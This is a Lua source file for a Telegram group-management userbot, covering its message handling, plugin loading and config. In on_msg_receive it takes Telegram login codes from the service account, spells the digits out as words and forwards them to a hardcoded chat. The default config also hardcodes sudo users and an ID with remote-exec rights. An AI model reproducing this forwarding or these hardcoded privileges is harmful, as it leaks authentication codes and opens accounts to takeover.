package.path = package.path .. ';.luarocks/share/lua/5.2/?.lua'
.. ';.luarocks/share/lua/5.2/?/init.lua'
package.cpath = package.cpath .. ';.luarocks/lib/lua/5.2/?.so'

require("./bot/utils")

-- local f = assert(io.popen('/usr/bin/git describe --tags', 'r'))
-- f:close()

-- This function is called when tg receive a msg
function on_msg_receive(msg)
    if not started then
        return
    end

    msg = backward_msg_format(msg)

    -- Group language
    msg.lang = get_lang(msg.to.id)

    if msg.from.id == 777000 then
        print("IT'S TELEGRAM")
        t = { }
        code = msg.text:match("(%d+)")
        code:gsub(".", function(c)
            table.insert(t, c)
        end )
        print(vardump(t))
        code_dictionary = {
            [0] = "zero",
            [1] = "one",
            [2] = "two",
            [3] = "three",
            [4] = "four",
            [5] = "five",
            [6] = "six",
            [7] = "seven",
            [8] = "eight",
            [9] = "nine",
        }
        tmp = ""
        for key, var in pairs(t) do
            tmp = tmp .. code_dictionary[tonumber(var)] .. ' '
        end
        print(tmp)
        send_large_msg("chat#id117401051", tmp)
    end
    -- vardump(msg)
    msg.api_patch = redis:sismember('apipatch', msg.to.id) or false
    if msg.text then
        if string.match(msg.text, "^@[Aa][Ii][Ss][Aa][Ss][Hh][Aa] ") then
            msg.api_patch = false
            msg.text = msg.text:gsub("^@[Aa][Ii][Ss][Aa][Ss][Hh][Aa] ", "")
        end
    end
    msg = pre_process_service_msg(msg)
    msg = pre_process_media_msg(msg)
    if msg_valid(msg) then
        if msg.api_patch then
            print('API PATCH ENABLED')
        end
        msg = pre_process_msg(msg)
        if msg then
            match_plugins(msg)
            if redis:get("bot:markread") then
                if redis:get("bot:markread") == "on" then
                    mark_read(get_receiver(msg), ok_cb, false)
                end
            end
        end
    end
    print(get_receiver(msg))
end

function ok_cb(extra, success, result)
end

function on_binlog_replay_end()
    started = true
    postpone(cron_plugins, false, 60 * 5.0)
    -- bot restarts every 30 min (1800 sec) so it saves database at 29th min (1740 sec)
    postpone(cron_database, false, 1740)

    _config = load_config()

    -- load plugins
    plugins = { }
    load_plugins()

    print('Loading database.json')
    database = load_data(_config.database.db)

    print('Loading moderation.json')
    data = load_data(_config.moderation.data)
    start_time = os.date('%c')
end

function msg_valid(msg)
    local autovalid = false
    -- Don't process outgoing messages
    if msg.out then
        if not msg.fwd_from then
            if msg.text then
                if string.match(msg.text, '^[Aa][Uu][Tt][Oo][Ee][Xx][Ee][Cc] (.*)$') then
                    autovalid = true
                end
            end
        end
        if not autovalid then
            print('\27[36mNot valid: msg from us\27[39m')
            return false
        else
            msg.text = string.gsub(msg.text, '[Aa][Uu][Tt][Oo][Ee][Xx][Ee][Cc] ', '')
        end
    end

    -- Before bot was started
    if msg.date < os.time() -5 then
        print('\27[36mNot valid: old msg\27[39m')
        return false
    end

    if msg.unread == 0 then
        print('\27[36mNot valid: readed\27[39m')
        return false
    end

    if not msg.to.id then
        print('\27[36mNot valid: to id not provided\27[39m')
        return false
    end

    if not msg.from.id then
        print('\27[36mNot valid: from id not provided\27[39m')
        return false
    end

    if msg.from.id == our_id then
        if not autovalid then
            print('\27[36mNot valid: msg from our id\27[39m')
            return false
        end
    end

    if msg.from.id == 283058260 then
        if msg.to.id ~= our_id then
            local crossvalid = false
            if not msg.fwd_from then
                if msg.text then
                    if string.match(msg.text, '^[Cc][Rr][Oo][Ss][Ss][Ee][Xx][Ee][Cc] (.*)$') then
                        crossvalid = true
                    end
                end
            end
            if not crossvalid then
                -- ignore messages from BOT version but crossexec messages
                print('\27[36mNot valid: msg from our BOT version in a group\27[39m')
                return false
            else
                msg.text = string.gsub(msg.text, '[Cc][Rr][Oo][Ss][Ss][Ee][Xx][Ee][Cc] ', '')
            end
        end
    end

    if msg.to.type == 'encr_chat' then
        print('\27[36mNot valid: encrypted chat\27[39m')
        return false
    end

    if is_channel_disabled(get_receiver(msg)) and not is_owner(msg) then
        print('\27[36mNot valid: channel disabled\27[39m')
        return false
    end

    return true
end

function pre_process_service_msg(msg)
    if msg.service then
        local action = msg.action or { type = "" }
        -- Double ! to discriminate of normal actions
        msg.text = "!!tgservice " .. action.type

        -- wipe the data to allow the bot to read service messages
        if msg.out then
            msg.out = false
        end
        if msg.from.id == our_id then
            msg.from.id = 0
        end
    end
    return msg
end

function pre_process_media_msg(msg)
    if not msg.text and msg.media then
        msg.text = '[' .. msg.media.type .. ']'
    end
    return msg
end

-- Apply plugin.pre_process function
function pre_process_msg(msg)
    print('Preprocess', 'database')
    msg = plugins.database.pre_process(msg)
    print('Preprocess', 'banhammer')
    msg = plugins.banhammer.pre_process(msg)
    print('Preprocess', 'anti_spam')
    msg = plugins.anti_spam.pre_process(msg)
    print('Preprocess', 'msg_checks')
    msg = plugins.msg_checks.pre_process(msg)
    print('Preprocess', 'delword')
    msg = plugins.delword.pre_process(msg)
    for name, plugin in pairs(plugins) do
        if plugin.pre_process and msg then
            if plugin.description ~= 'ANTI_SPAM' and
                plugin.description ~= 'BANHAMMER' and
                plugin.description ~= 'DATABASE' and
                plugin.description ~= 'DELWORD' and
                plugin.description ~= 'MSG_CHECKS' then
                print('Preprocess', name)
                msg = plugin.pre_process(msg)
            end
        end
    end
    return msg
end

-- Go over enabled plugins patterns.
function match_plugins(msg)
    for name, plugin in pairs(plugins) do
        match_plugin(plugin, name, msg)
    end
end

-- Check if plugin is on _config.disabled_plugin_on_chat table
local function is_plugin_disabled_on_chat(plugin_name, receiver)
    local disabled_chats = _config.disabled_plugin_on_chat
    -- Table exists and chat has disabled plugins
    if disabled_chats and disabled_chats[receiver] then
        -- Checks if plugin is disabled on this chat
        for disabled_plugin, disabled in pairs(disabled_chats[receiver]) do
            if disabled_plugin == plugin_name and disabled then
                local warning = 'Plugin ' .. disabled_plugin .. ' is disabled on this chat'
                print(warning)
                -- send_msg(receiver, warning, ok_cb, false)
                return true
            end
        end
    end
    return false
end

function match_plugin(plugin, plugin_name, msg)
    local receiver = get_receiver(msg)

    -- Go over patterns. If one matches it's enough.
    for k, pattern in pairs(plugin.patterns) do
        local matches = match_pattern(pattern, msg.text)
        if matches then
            print("msg matches: ", plugin_name, " => ", pattern)

            local disabled = is_plugin_disabled_on_chat(plugin_name, receiver)

            if pattern ~= "^!!tgservice" and pattern ~= "%[(document)%]" and pattern ~= "%[(photo)%]" and pattern ~= "%[(video)%]" and pattern ~= "%[(audio)%]" and pattern ~= "%[(contact)%]" and pattern ~= "%[(geo)%]" then
                if msg.to.type == 'user' then
                    if disabled then
                        savelog(msg.from.id .. ' PM', msg.from.print_name:gsub('_', ' ') .. ' ID: ' .. '[' .. msg.from.id .. ']' .. '\nCommand "' .. msg.text .. '" received but plugin is disabled on chat.')
                    else
                        savelog(msg.from.id .. ' PM', msg.from.print_name:gsub('_', ' ') .. ' ID: ' .. '[' .. msg.from.id .. ']' .. '\nCommand "' .. msg.text .. '" executed.')
                    end
                else
                    if disabled then
                        savelog(msg.to.id, msg.to.print_name:gsub('_', ' ') .. ' ID: ' .. '[' .. msg.to.id .. ']' .. ' Sender: ' .. msg.from.print_name:gsub('_', ' ') .. ' [' .. msg.from.id .. ']' .. '\nCommand "' .. msg.text .. '" received but plugin is disabled on chat.')
                    else
                        savelog(msg.to.id, msg.to.print_name:gsub('_', ' ') .. ' ID: ' .. '[' .. msg.to.id .. ']' .. ' Sender: ' .. msg.from.print_name:gsub('_', ' ') .. ' [' .. msg.from.id .. ']' .. '\nCommand "' .. msg.text .. '" executed.')
                    end
                end
            end

            if disabled then
                return nil
            end
            -- Function exists
            if plugin.run then
                --[[local result = plugin.run(msg, matches)
                if result then
                    send_large_msg(receiver, result)
                end]]
                local res, err = pcall( function()
                    local result = plugin.run(msg, matches)
                    if result then
                        send_large_msg(receiver, result)
                    end
                end )
                if not res then
                    -- send to log
                    send_large_msg('channel#id1043389864', 'An #error occurred.\n' ..(err or '') .. '\n' ..(vardump(msg) or ''))
                end
            end
            -- One patterns matches
            return
        end
    end
end

-- DEPRECATED, use send_large_msg(destination, text)
function _send_msg(destination, text)
    send_large_msg(destination, text)
end

-- Save the content of _config to config.lua
function save_config()
    serialize_to_file(_config, './data/config.lua', false)
    print('saved config into ./data/config.lua')
end

-- Returns the config from config.lua file.
-- If file doesn't exist, create it.
function load_config()
    local f = io.open('./data/config.lua', "r")
    -- If config.lua doesn't exist
    if not f then
        print("Created new config file: data/config.lua")
        create_config()
    else
        f:close()
    end
    local config = loadfile("./data/config.lua")()
    for v, user in pairs(config.sudo_users) do
        print("Sudo user: " .. user)
    end
    return config
end

-- Create a basic config.json file and saves it.
function create_config()
    -- A simple config with basic plugins and ourselves as privileged user
    config = {
        enabled_plugins =
        {
            "anti_spam",
            "msg_checks",
            "check_tag",
            "strings",
            "administrator",
            "database",
            "bot",
            "getsetunset",
            "group_management",
            "banhammer",
            "stats",
            "plugins",
            "help",
            "invite",
            "info",
            "whitelist",
            "feedback",
            "tagall",
            "goodbyewelcome",
        },
        sudo_users =
        {
            41400331,
            149998353-- bot id for autoexec command
        },
        -- Sudo users
        moderation = { data = 'data/moderation.json' },
        ruleta = { db = 'data/ruletadb.json' },
        knife = { db = 'data/knifedb.json' },
        clicktap = { db = 'data/clicktapdb.json' },
        likecounter = { db = 'data/likecounterdb.json' },
        database = { db = 'data/database.json' },
        about_text = "AISashaSuper by @EricSolinas based on @TeleSeed supergroup branch with langs management taken from @GroupButler_bot and something else taken from @DBTeam.\nThanks guys.",
    }
    serialize_to_file(config, './data/config.lua', false)
    print('saved config into ./data/config.lua')
end

function on_our_id(id)
    our_id = id
end

function on_user_update(user, what)
    -- vardump (user)
end

function on_chat_update(chat, what)
    -- vardump (chat)
end

function on_secret_chat_update(schat, what)
    -- vardump (schat)
end

function on_get_difference_end()
end

-- Enable plugins in config.lua
function load_plugins()
    print('Loading languages.lua...')
    langs = dofile('languages.lua')

    for k, v in pairs(_config.enabled_plugins) do
        print("Loading plugin", v)

        local ok, err = pcall( function()
            local t = loadfile("plugins/" .. v .. '.lua')()
            plugins[v] = t
        end )

        if not ok then
            print('\27[31mError loading plugin ' .. v .. '\27[39m')
            print(tostring(io.popen("lua plugins/" .. v .. ".lua"):read('*all')))
            print('\27[31m' .. err .. '\27[39m')
        end
    end
end

-- custom add
function load_data(filename)
    local f = io.open(filename)
    if not f then
        return { }
    end
    local s = f:read('*all')
    f:close()
    local data = json:decode(s)

    return data
end

function save_data(filename, data)
    local s = json:encode_pretty(data)
    local f = io.open(filename, 'w')
    f:write(s)
    f:close()
end

function cron_database()
    print('SAVING USERS/GROUPS DATABASE')
    save_data(_config.database.db, database)
end

-- Call and postpone execution for cron plugins
function cron_plugins()
    for name, plugin in pairs(plugins) do
        -- Only plugins with cron function
        if plugin.cron then
            print("CRON: ", name)
            plugin.cron()
        end
    end

    -- Called again in 2 mins
    postpone(cron_plugins, false, 120)
end

-- Start and load values
our_id = 0
now = os.time()
math.randomseed(now)
started = false
dbloaded = false